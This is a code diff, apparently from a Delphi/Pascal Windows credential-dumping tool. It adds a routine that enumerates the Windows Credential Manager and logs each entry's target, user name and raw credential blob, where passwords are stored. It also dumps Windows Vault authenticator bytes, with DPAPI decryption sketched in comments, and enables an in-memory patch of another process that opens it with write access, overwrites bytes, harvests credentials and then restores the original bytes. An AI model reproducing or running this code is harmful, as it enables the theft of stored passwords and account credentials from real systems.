@@ -18,7 +18,7 @@ $VaultSchema = @{
 }
 
 uses
-  Classes, SysUtils,windows,utils,upsapi,umemory;
+  Classes, SysUtils,windows,utils,upsapi,umemory,ucryptoapi;
 
 type VAULT_SCHEMA_ELEMENT_ID =(
     ElementId_Illegal = $0,
@@ -66,6 +66,16 @@ Type _VAULT_ITEM_ELEMENT=record  //similar to _VAULT_ITEM_DATA
  data : pointer;
 End;
 
+Type _VAULT_ITEM_ELEMENT_BYTEARRAY=record  //similar to _VAULT_ITEM_DATA
+ SchemaElementId : VAULT_SCHEMA_ELEMENT_ID;
+ Unk0 : dword;
+ //ItemValue : _VAULT_VARIANT
+ veType : VAULT_ELEMENT_TYPE;
+ Unk1 : dword;
+ Length:DWORD;
+ Value:PBYTE;
+End;
+
 type _VAULT_BYTE_BUFFER =record
 	 Length:DWORD;
 	 Value:PBYTE;
@@ -101,16 +111,81 @@ VAULTGETITEM7:function (vault:phandle; SchemaId:GUID; Resource:pointer{PVAULT_IT
 {private static extern uint VaultGetItem8(IntPtr pVaultHandle, IntPtr pSchemaId, IntPtr pResource, IntPtr pIdentity, IntPtr pPackageSid, IntPtr hwndOwner, uint dwFlags, out IntPtr ppItems);}
 VAULTGETITEM8:function (vault:phandle; SchemaId:pointer{pointer/GUID}; Resource:pointer{PVAULT_ITEM_DATA};Identity:pointer{PVAULT_ITEM_DATA}; PackageSid:pointer{PVAULT_ITEM_DATA}; hWnd:pointer{hwnd};  Flags:dword;  out pItem:pointer {pointer/PVAULT_ITEM_8}):ntstatus;stdcall;
 
-function Init:boolean;
-function enum:boolean;
+function VaultInit:boolean;
+function VaultEnum:boolean;
 function patch(pid:dword):boolean;
+function CredEnum:boolean;
 
 implementation
 
 
+//
+const
+  CRED_TYPE_GENERIC                 = 1;
+  CRED_TYPE_DOMAIN_PASSWORD         = 2;
+  CRED_TYPE_DOMAIN_CERTIFICATE      = 3;
+  CRED_TYPE_DOMAIN_VISIBLE_PASSWORD = 4;
+  CRED_TYPE_MAXIMUM                 = 5;  // Maximum supported cred type
+  CRED_TYPE_MAXIMUM_EX              = CRED_TYPE_MAXIMUM + 1000;  // Allow new applications to run on old OSes
+
+  function CredReadW(TargetName: LPCWSTR; Type_: DWORD; Flags: DWORD; var Credential: PCREDENTIALW): BOOL; stdcall; external 'advapi32.dll';
+  function CredEnumerateW(Filter: LPCWSTR; Flags: DWORD; out Count: DWORD; out Credential: pointer {PCredentialArray}): BOOL; stdcall; external 'advapi32.dll';
+  Procedure CredFree(Buffer:pointer); stdcall; external 'advapi32.dll';
+//
+
+  function CredEnum:boolean;
+var
+  Credentials: array of pointer; //PCredentialArray;
+  ptr:pointer;
+  Credential: PCREDENTIALW;
+  UserName: WideString;
+  i: integer;
+  dwCount: DWORD;
+  bytes:array[0..1023] of byte;
+begin
+  result:=false;
+  //setlength(Credentials ,1024);
+    if CredEnumerateW(nil{PChar('TERM*')}, 0, dwCount, Credentials) then
+    begin
+      result:=true;
+      writeln(dwcount);
+      //ptr:=credentials;
+      for i:= 0 to dwCount - 1  do
+        begin
+          log('*************************************',1);
+          CopyMemory(@bytes[0],Credentials[i],sizeof(_CREDENTIALW)) ;
+          //log('Hexa:'+ByteToHexaString (bytes),1);
+          log('Flags:'+inttostr(PCREDENTIALW(Credentials[i])^.Flags)  ,1);
+          log('Type_:'+inttostr(PCREDENTIALW(Credentials[i])^.Type_   ),1);
+          log('TargetName:'+widestring(PCREDENTIALW(Credentials[i])^.TargetName ),1);
+          log('Comment:'+widestring(PCREDENTIALW(Credentials[i])^.Comment ),1);
+          log('TargetAlias:'+widestring(PCREDENTIALW(Credentials[i])^.TargetAlias ),1);
+          log('UserName:'+widestring(PCREDENTIALW(Credentials[i])^.UserName ),1);
+          //writeln(PCREDENTIALW(Credentials[i])^.CredentialBlobSize);
+          if PCREDENTIALW(Credentials[i])^.CredentialBlobSize >0 then
+             begin
+               //we could use entropy/salt + CryptUnprotectData
+               CopyMemory (@bytes[0],PCREDENTIALW(Credentials[i])^.CredentialBlob,PCREDENTIALW(Credentials[i])^.CredentialBlobSize);
+               log('CredentialBlob:'+copy(BytetoAnsiString (bytes),1,PCREDENTIALW(Credentials[i])^.CredentialBlobSize),1);
+             end;
+          //inc(ptr,sizeof(pointer));
+            {
+            if CredReadW(PCREDENTIALW(Credentials[i]).TargetName, PCREDENTIALW(Credentials[i]).Type_, 0, Credential) then
+            begin
+              //log(widestring(Credential.UserName));
+              UserName:= Credential.UserName;
+              log(PCREDENTIALW(Credentials[i]).TargetName + ' :: ' + UserName + ' >> ' + IntToStr(PCREDENTIALW(Credentials[i]).Type_));
+              log(IntToStr(Credential.CredentialBlobSize));
+            end; // if CredReadW
+            }
+        end; //for i:= 0 to dwCount - 1  do
+    credfree(Credentials);
+    end //if CredEnumerateW
+    else log('CredEnumerateW failed, '+inttostr(getlasterror));
+end;
 
 
-function Init:boolean;
+function VaultInit:boolean;
 var
   hVaultLib:thandle;
   bStatus:boolean = FALSE;
@@ -143,9 +218,9 @@ end;
 
 //check against vaultcmd
 
-function enum:boolean;
+function VaultEnum:boolean;
 var
-  i,j,cbvaults,cbItems:dword;
+  i,j,k,cbvaults,cbItems:dword;
   //vaults:array [0..254] of lpguid;
   status:NTStatus;
   //hvault:handle;
@@ -155,6 +230,8 @@ var
   pitem8:pointer ;
   //vi:_VAULT_ITEM_8;
   VIE:_VAULT_ITEM_ELEMENT;
+  VIE_BYTE:_VAULT_ITEM_ELEMENT_BYTEARRAY ;
+  bytes,output:tbytes;
 begin
     result:=false;
     //fillchar(vaults,sizeof(vaults),0);
@@ -203,8 +280,17 @@ begin
                                     //log('veType:'+inttostr(integer(vie.ItemValue.veType)));
                                     if vie.veType=ElementType_ByteArray then
                                            begin
-                                           //CopyMemory (@vie,PVAULT_ITEM_8(pItem8).Authenticator  ,sizeof(vie));
-                                           log('data:'+inttostr(nativeuint(vie.data)));
+                                           CopyMemory (@VIE_BYTE,PVAULT_ITEM_8(pItem8).Authenticator  ,sizeof(VIE_BYTE));
+                                           log('Length:'+inttostr(nativeuint(VIE_BYTE.Length )) );
+                                           log('Data:'+inttohex(nativeuint(VIE_BYTE.Value ),8) );
+                                           if VIE_BYTE.Length>0 then
+                                               begin
+                                               setlength(bytes,VIE_BYTE.Length);
+                                               copymemory(@bytes[0],VIE_BYTE.Value,VIE_BYTE.Length);
+                                               for k:=0 to VIE_BYTE.Length do write(bytes[k]);log('');
+                                               //dpapi is used
+                                               //CryptUnProtectData_(bytes,output);
+                                               end;
                                            end;
                                     VaultFree(pItem8);
                                     end
@@ -274,19 +360,21 @@ begin
   if (lowercase(osarch)='amd64') then
      begin
      //nothing needed here
+     patch_pos:=6;
      end;
   if (lowercase(osarch)='x86') then
      begin
      //nothing needed here
      end;
-  {
+
+
   if patch_pos =0 then
      begin
      log('no patch mod for this windows version',1);
      exit;
      end;
   log('patch pos:'+inttostr(patch_pos ),0);
-  }
+
   //
   hprocess:=thandle(-1);
   hprocess:=openprocess( PROCESS_VM_READ or PROCESS_VM_WRITE or PROCESS_VM_OPERATION or PROCESS_QUERY_INFORMATION,
@@ -325,22 +413,24 @@ begin
                                  //if ReadProcessMemory( hprocess,pointer(offset+patch_pos),@backup[0],2,@read) then
                                  if ReadMem  (hprocess,offset+patch_pos,backup) then
                                    begin
-                                   log('ReadProcessMemory OK '+leftpad(inttohex(backup[0],1),2)+leftpad(inttohex(backup[1],1),2),0);
+                                   log('ReadProcessMemory OK '+leftpad(inttohex(backup[0],1),2));
                                    if WriteMem(hprocess,offset+patch_pos,after)=true then
                                         begin
                                         log('patch ok',0);
                                         try
                                         log('***************************************',0);
-                                        if enum //do something
-                                           then begin log('SamQueryInformationUser OK',0);result:=true;end
-                                           else log('SamQueryInformationUser NOT OK',1);
+                                        try
+                                        if credenum //do something
+                                           then begin log('enum OK',0);result:=true;end
+                                           else log('enum NOT OK',1);
+                                        except end;
                                         log('***************************************',0);
                                         finally //we really do want to patch back
-                                        if WriteMem(hprocess,offset+patch_pos,backup)=true then log('patch ok') else log('patch failed');
+                                        if WriteMem(hprocess,offset+patch_pos,backup)=true then log('patch ok') else log('patch1 failed');
                                         //should we read and compare before/after?
                                         end;
                                         end
-                                        else log('patch failed',1);
+                                        else log('patch0 failed',1);
                                    end;
                                  end;
                             {//test - lets read first 4 bytes of our module
